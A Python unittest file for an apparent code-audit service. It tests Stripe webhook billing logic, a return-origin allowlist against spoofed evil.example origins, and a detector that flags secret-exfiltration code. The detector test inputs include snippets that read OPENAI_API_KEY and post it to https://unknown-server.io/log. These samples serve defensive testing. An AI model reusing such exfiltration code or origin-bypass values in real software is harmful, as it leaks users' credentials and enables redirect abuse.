import unittest
from unittest.mock import patch
from fastapi.testclient import TestClient
from starlette.requests import Request
import main

class BillingMigrationTests(unittest.TestCase):
 def test_return_origin_allowlist(self):
  def req(origin): return Request({'type':'http','headers':[(b'x-audit-return-origin',origin.encode())]})
  with patch.object(main,'APP_BASE_URL','https://code-trust-check.onrender.com'):
   self.assertEqual(main.get_billing_return_url(req('https://ai-code-audit.samkiper.chatgpt.site')),'https://ai-code-audit.samkiper.chatgpt.site')
   for origin in ['https://evil.example','https://ai-code-audit.samkiper.chatgpt.site.evil.example','https://ai-code-audit.samkiper.chatgpt.site@evil.example']:
    self.assertEqual(main.get_billing_return_url(req(origin)),'https://code-trust-check.onrender.com')
 def webhook(self,payment='paid',failure=False):
  event={'type':'checkout.session.completed','data':{'object':{'payment_status':payment,'subscription':'sub_existing','customer':'cus_existing','metadata':{'user_id':'user'}}}}
  with patch.object(main,'STRIPE_SECRET_KEY','test'),patch.object(main,'STRIPE_WEBHOOK_SECRET','test'),patch.object(main.stripe.Webhook,'construct_event',return_value=event),patch.object(main,'resolve_supabase_user_id_for_stripe_event',return_value='user'),patch.object(main.stripe.Subscription,'retrieve',side_effect=RuntimeError('offline') if failure else None,return_value={'status':'active'}),patch.object(main,'sync_user_plan_from_subscription',return_value=True) as sync:
   result=TestClient(main.app).post('/stripe/webhook',content=b'{}')
   return result,sync.call_count
 def test_unpaid_checkout_does_not_grant_access(self):
  response,calls=self.webhook(payment='unpaid');self.assertEqual(response.status_code,200);self.assertEqual(calls,0)
 def test_lookup_failure_retries_without_grant(self):
  response,calls=self.webhook(failure=True);self.assertEqual(response.status_code,503);self.assertEqual(calls,0)
 def test_verified_paid_checkout_syncs(self):
  response,calls=self.webhook();self.assertEqual(response.status_code,200);self.assertEqual(calls,1)

class CredentialSourceRegressionTests(unittest.TestCase):
 def test_isolated_environment_read_is_notice_even_with_unspecified_intent(self):
  result=main.analyze_code(code='import os\nkey = os.getenv("OPENAI_API_KEY")',intent='Read a local environment setting; do not transmit it.')
  sources=[flag for flag in result['flags'] if flag.get('pattern')=='environment_secret_access']
  self.assertTrue(sources)
  self.assertTrue(all(flag['severity']<8 for flag in sources))
 def test_exfiltration_keeps_high_severity(self):
  result=main.analyze_code(code='import os, requests\nkey = os.getenv("OPENAI_API_KEY")\nrequests.post("https://unknown-server.io/log",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
  self.assertTrue(any(flag.get('pattern')=='secret_exfiltration_chain' and flag['severity']>=18 for flag in result['flags']))

 def test_inline_environment_egress_does_not_require_assignment(self):
  code='import os, requests\nrequests.post("https://unknown-server.io/log",json={"key":os.getenv("OPENAI_API_KEY")})'
  result=main.analyze_code(intent='Build a local report. Do not transmit credentials.',code=code)
  self.assertTrue(any(flag.get('pattern')=='secret_exfiltration_chain' and flag['severity']>=18 for flag in result['flags']))
 def test_expected_inline_auth_has_destination_and_header_evidence(self):
  code='import os, requests\nrequests.get("https://api.example.com/data",headers={"Authorization":os.getenv("API_KEY")})'
  result=main.analyze_code(intent='Authenticate to api.example.com using an API key in the authorization header.',code=code)
  self.assertFalse(any(flag.get('pattern')=='secret_exfiltration_chain' for flag in result['flags']))
  self.assertTrue(any(flag.get('pattern')=='credential_authentication' for flag in result['flags']))
 def test_negated_destination_does_not_authorize_inline_transmission(self):
  code='import os, requests\nrequests.get("https://api.example.com/data",headers={"Authorization":os.getenv("API_KEY")})'
  flags=main.inline_environment_egress(code,'Do not authenticate to api.example.com with any credential.')
  self.assertTrue(any(flag['severity']>=18 for flag in flags))
